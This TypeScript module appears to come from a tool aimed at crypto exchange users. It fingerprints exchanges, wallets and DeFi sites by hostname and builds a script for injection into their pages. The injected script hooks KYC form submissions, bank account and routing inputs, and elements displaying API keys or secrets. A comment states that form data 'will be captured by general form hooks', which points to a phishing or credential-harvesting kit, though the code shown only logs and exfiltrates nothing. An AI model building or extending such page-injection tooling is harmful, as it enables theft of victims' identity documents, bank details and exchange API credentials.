/**
 * CEX/Exchange Mode Detector
 *
 * Detects if target is a CEX (centralized exchange) vs DEX/Wallet
 * and handles CEX-specific flows (KYC, fiat, bank linking, etc.)
 */

import type { Page } from 'puppeteer'

export type PlatformType = 'cex' | 'dex' | 'wallet' | 'bridge' | 'lending' | 'other'

export interface CexFeatures {
  hasKyc: boolean
  hasFiatDeposit: boolean
  hasBankLinking: boolean
  hasWithdrawalLimits: boolean
  hasApiKeys: boolean
  hasMargin: boolean
  hasStaking: boolean
}

export interface PlatformDetection {
  type: PlatformType
  platform: string
  cexFeatures?: CexFeatures
}

export async function detectPlatformType(page: Page): Promise<PlatformDetection> {
  console.info('[CEX-DETECTOR] Analyzing platform type...')

  const hostname = page.url().split('/')[2].replace('www.', '')

  // Known platform mappings
  const CEX_PLATFORMS: Record<string, string> = {
    'coinbase': 'Coinbase',
    'binance': 'Binance',
    'kraken': 'Kraken',
    'bybit': 'Bybit',
    'okx': 'OKX',
    'mexc': 'MEXC',
    'huobi': 'Huobi',
    'kucoin': 'Kucoin',
    'upbit': 'Upbit',
    'bitfinex': 'Bitfinex',
  }

  const DEX_PLATFORMS: Record<string, string> = {
    'uniswap': 'Uniswap',
    'sushiswap': 'SushiSwap',
    'curve': 'Curve',
    '1inch': '1inch',
    'balancer': 'Balancer',
    'pancakeswap': 'PancakeSwap',
  }

  const WALLET_PLATFORMS: Record<string, string> = {
    'metamask': 'MetaMask',
    'phantom': 'Phantom',
    'trezor': 'Trezor',
    'ledger': 'Ledger',
    'exodus': 'Exodus',
    'myetherwallet': 'MyEtherWallet',
  }

  const BRIDGE_PLATFORMS: Record<string, string> = {
    'across': 'Across',
    'stargate': 'Stargate',
    'layerswap': 'LayerSwap',
    'axelar': 'Axelar',
  }

  const LENDING_PLATFORMS: Record<string, string> = {
    'aave': 'Aave',
    'compound': 'Compound',
    'lido': 'Lido',
    'maker': 'Maker',
  }

  // Detect platform type
  let type: PlatformType = 'other'
  let platform = hostname

  for (const [key, name] of Object.entries(CEX_PLATFORMS)) {
    if (hostname.includes(key)) {
      type = 'cex'
      platform = name
      break
    }
  }

  if (type === 'other') {
    for (const [key, name] of Object.entries(DEX_PLATFORMS)) {
      if (hostname.includes(key)) {
        type = 'dex'
        platform = name
        break
      }
    }
  }

  if (type === 'other') {
    for (const [key, name] of Object.entries(WALLET_PLATFORMS)) {
      if (hostname.includes(key)) {
        type = 'wallet'
        platform = name
        break
      }
    }
  }

  if (type === 'other') {
    for (const [key, name] of Object.entries(BRIDGE_PLATFORMS)) {
      if (hostname.includes(key)) {
        type = 'bridge'
        platform = name
        break
      }
    }
  }

  if (type === 'other') {
    for (const [key, name] of Object.entries(LENDING_PLATFORMS)) {
      if (hostname.includes(key)) {
        type = 'lending'
        platform = name
        break
      }
    }
  }

  const detection: PlatformDetection = {
    type,
    platform,
  }

  // If CEX, detect specific features
  if (type === 'cex') {
    detection.cexFeatures = await detectCexFeatures(page)
  }

  console.info(`[CEX-DETECTOR] Detected: ${type} - ${platform}`)
  return detection
}

async function detectCexFeatures(page: Page): Promise<CexFeatures> {
  console.info('[CEX-DETECTOR] Scanning for CEX-specific features...')

  const features = await page.evaluate(() => {
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    return {
      hasKyc:
        pageText.includes('kyc') ||
        pageText.includes('verification') ||
        pageText.includes('identity') ||
        pageHtml.includes('kyc'),

      hasFiatDeposit:
        pageText.includes('fiat') ||
        pageText.includes('deposit') ||
        pageText.includes('bank') ||
        pageText.includes('credit card'),

      hasBankLinking:
        pageText.includes('bank account') ||
        pageText.includes('wire') ||
        pageText.includes('ach') ||
        pageHtml.includes('bank-link'),

      hasWithdrawalLimits:
        pageText.includes('withdrawal limit') ||
        pageText.includes('daily limit') ||
        pageText.includes('max withdrawal'),

      hasApiKeys:
        pageText.includes('api key') ||
        pageText.includes('api secret') ||
        pageHtml.includes('api-key'),

      hasMargin:
        pageText.includes('margin') ||
        pageText.includes('leverage') ||
        pageText.includes('futures'),

      hasStaking:
        pageText.includes('stake') ||
        pageText.includes('staking') ||
        pageText.includes('yield'),
    }
  })

  return features
}

export function buildCexModeInjectionCode(detection: PlatformDetection): string {
  if (detection.type !== 'cex') {
    return ''
  }

  return `
<script>
// CEX-specific feature handling
(function() {
  var PLATFORM = '${detection.platform}';
  var FEATURES = ${JSON.stringify(detection.cexFeatures)};

  // Monitor for KYC flow
  if (FEATURES.hasKyc) {
    console.log('[CEX-MODE] KYC flow detected');

    // Hook KYC form submissions
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && form.innerHTML.toLowerCase().includes('verify') || form.innerHTML.toLowerCase().includes('kyc')) {
        console.log('[CEX-MODE] KYC form submitted');
        // Form data will be captured by general form hooks
      }
    }, true);
  }

  // Monitor for bank linking
  if (FEATURES.hasBankLinking) {
    console.log('[CEX-MODE] Bank linking flow detected');

    // Hook bank account inputs
    var bankInputs = document.querySelectorAll('input[placeholder*="account"], input[placeholder*="routing"]');
    bankInputs.forEach(function(input) {
      input.addEventListener('change', function() {
        console.log('[CEX-MODE] Bank account input changed');
      });
    });
  }

  // Monitor for fiat deposits
  if (FEATURES.hasFiatDeposit) {
    console.log('[CEX-MODE] Fiat deposit flow detected');
  }

  // Monitor for API key generation
  if (FEATURES.hasApiKeys) {
    console.log('[CEX-MODE] API key generation available');

    // Hook API key displays
    var keyElements = document.querySelectorAll('[class*="key"], [class*="secret"]');
    keyElements.forEach(function(el) {
      if (el.textContent && el.textContent.length > 20) {
        console.log('[CEX-MODE] API key element found');
      }
    });
  }

  console.log('[CEX-MODE] CEX mode enabled for ' + PLATFORM);
})();
</script>
`
}

export function generateCexFlowDetectionCode(): string {
  return `
// CEX-specific flow detection
var CEX_FLOWS = {
  kyc: {
    name: 'KYC Verification',
    steps: ['Identity upload', 'Address verification', 'Approved'],
  },
  bankLink: {
    name: 'Bank Account Linking',
    steps: ['Account number', 'Routing number', 'Verification', 'Linked'],
  },
  fiatDeposit: {
    name: 'Fiat Deposit',
    steps: ['Select amount', 'Choose payment method', 'Complete payment', 'Deposited'],
  },
  apiKey: {
    name: 'API Key Generation',
    steps: ['Generate key', 'Copy secret', 'Confirm', 'Active'],
  },
};

function detectCexFlows() {
  var pageText = document.body.textContent.toLowerCase();
  var detected = [];

  if (pageText.includes('kyc') || pageText.includes('verification')) {
    detected.push('kyc');
  }
  if (pageText.includes('bank')) {
    detected.push('bankLink');
  }
  if (pageText.includes('fiat') || pageText.includes('deposit')) {
    detected.push('fiatDeposit');
  }
  if (pageText.includes('api')) {
    detected.push('apiKey');
  }

  return detected;
}
`
}
